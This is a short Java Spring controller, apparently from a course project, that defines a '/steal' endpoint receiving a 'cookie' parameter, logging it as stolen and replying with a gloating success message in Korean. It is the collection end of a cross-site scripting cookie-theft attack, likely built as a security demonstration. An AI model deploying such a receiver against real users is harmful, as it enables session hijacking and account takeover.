package com.uplus.eureka.book.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CookieStealController {

	@GetMapping("/steal")
    public String steal(@RequestParam(name = "cookie", required = false) String cookie) {
		System.out.println("CookieStealController.......");
        System.out.println("쿠키 탈취됨: " + cookie);
        return "쿠키 탈취 성공! 😈";
    }
}
